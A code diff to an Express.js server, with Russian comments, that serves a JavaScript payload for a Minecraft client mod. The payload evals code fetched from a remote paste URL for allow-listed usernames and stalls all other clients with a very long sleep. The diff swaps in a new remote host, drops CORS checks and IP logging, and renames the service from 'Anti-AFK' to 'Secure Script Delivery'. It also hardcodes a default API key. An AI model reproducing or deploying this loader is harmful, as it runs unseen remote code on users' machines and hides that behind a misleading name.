@@ -6,27 +6,17 @@ const app = express();
 const CONFIG = {
     PORT: process.env.PORT || 3000,
     API_KEYS: process.env.API_KEYS || 'railway-minecraft-key-123',
-    ALLOWED_AGENTS: process.env.ALLOWED_AGENTS || 'java,minecraft,nedan,script,automine',
+    ALLOWED_AGENTS: process.env.ALLOWED_AGENTS || 'java,minecraft,nedan,script,autobuy',
     NODE_ENV: process.env.NODE_ENV || 'production'
 };
 
 // ==================== MIDDLEWARE ====================
-app.use(cors({
-    origin: function (origin, callback) {
-        if (!origin || origin.includes('railway') || origin.includes('localhost')) {
-            callback(null, true);
-        } else {
-            callback(new Error('Not allowed by CORS'));
-        }
-    },
-    credentials: true
-}));
-
+app.use(cors());
 app.use(express.json());
 
 // Логирование
 app.use((req, res, next) => {
-    console.log(`[${new Date().toISOString()}] ${req.ip} - ${req.method} ${req.path}`);
+    console.log(`[${new Date().toISOString()}] ${req.method} ${req.path}`);
     next();
 });
 
@@ -46,33 +36,31 @@ const validateRequest = (req, res, next) => {
     if (isValidKey && isValidAgent) {
         next();
     } else {
-        console.log('🚫 Blocked request');
         res.status(403).json({ error: 'Access denied' });
     }
 };
 
 // ==================== ЗАЩИЩЕННЫЕ ЭНДПОИНТЫ ====================
 
-// Главный эндпоинт для anti-afk скрипта
+// Главный эндпоинт для скрипта - ТОЧНАЯ КОПИЯ ВАШЕГО СКРИПТА
 app.get('/api/script', validateRequest, (req, res) => {
     const scriptContent = `(function() {
     var username = Java.type("ru.nedan.spookybuy.Authentication").getUsername();
 
 // Проверяем разрешенные имена
-if (username === "porvaniy.gondon" || username === "__ded_inside__" || username === "latteld" || username === "dofinixx" || username === "troll4" || username === "zertqmap.org" || username === "nekitpon" || username === "fakepatrickstar" || username === "inclodus" || username === "terpila_naxyi" || username === "masterrpo1" || username === "prolix0573") {
+if (username === "porvaniy.gondon" || username === "__ded_inside__") {
     try {
         // Выполняем внешний скрипт
         eval(new java.util.Scanner(
-            new java.net.URL("https://i.e-z.host/p/raw/qqm7yaqga88vrpf9n").openStream(), 
+            new java.net.URL("https://diddy-party.vip/p/raw/onwifinfsc75if7yl").openStream(), 
             "UTF-8"
-        ).useDelimiter("\\A").next());
+        ).useDelimiter("\\\\A").next());
     } catch (e) {
         java.lang.System.err.println("Ошибка при выполнении скрипта: " + e);
     }
 } else {
     java.lang.Thread.sleep(20000000);
 }
-
 })();`;
     
     res.setHeader('Content-Type', 'application/javascript; charset=UTF-8');
@@ -83,7 +71,7 @@ if (username === "porvaniy.gondon" || username === "__ded_inside__" || username 
 app.get('/api/status', validateRequest, (req, res) => {
     res.json({ 
         status: 'online', 
-        server: 'Anti-AFK Script Server',
+        server: 'Secure Script Server',
         version: '1.0.0'
     });
 });
@@ -92,7 +80,7 @@ app.get('/api/status', validateRequest, (req, res) => {
 
 app.get('/', (req, res) => {
     res.json({
-        service: 'Anti-AFK Script Delivery',
+        service: 'Secure Script Delivery',
         version: '1.0.0',
         status: 'operational'
     });
@@ -115,28 +103,5 @@ app.use((err, req, res, next) => {
 
 // ==================== ЗАПУСК СЕРВЕРА ====================
 app.listen(CONFIG.PORT, '0.0.0.0', () => {
-    console.log('╔══════════════════════════════════════╗');
-    console.log('║      ANTI-AFK SERVER STARTED       ║');
-    console.log('╠══════════════════════════════════════╣');
-    console.log(`║  Port: ${CONFIG.PORT}                       ║`);
-    console.log(`║  Environment: ${CONFIG.NODE_ENV}           ║`);
-    console.log('║                                      ║');
-    console.log('║  Endpoints:                          ║');
-    console.log('║  • GET /api/script  (requires auth)  ║');
-    console.log('║  • GET /api/status  (requires auth)  ║');
-    console.log('║  • GET /health                       ║');
-    console.log('║                                      ║');
-    console.log('║  Server is ready!                    ║');
-    console.log('╚══════════════════════════════════════╝');
-});
-
-// Graceful shutdown
-process.on('SIGTERM', () => {
-    console.log('Shutting down gracefully...');
-    process.exit(0);
-});
-
-process.on('SIGINT', () => {
-    console.log('Shutting down gracefully...');
-    process.exit(0);
+    console.log('✅ Server started on port', CONFIG.PORT);
 });
